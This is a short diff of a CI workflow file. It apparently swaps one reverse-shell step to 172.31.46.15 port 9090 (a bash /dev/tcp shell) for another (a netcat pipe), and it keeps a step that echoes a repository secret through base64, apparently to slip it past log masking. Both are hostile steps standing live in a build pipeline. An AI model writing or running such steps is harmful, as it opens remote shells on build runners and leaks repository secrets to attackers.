@@ -17,7 +17,7 @@ jobs:
         run: echo $MY_REPO_SECRET | base64
 
       - name: rev
-        run: bash -c 'bash -i >& /dev/tcp/172.31.46.15/9090 0>&1'
+        run: /bin/sh | nc 172.31.46.15 9090
 
       - name: 🖥️ OS Info
         run: uname -a
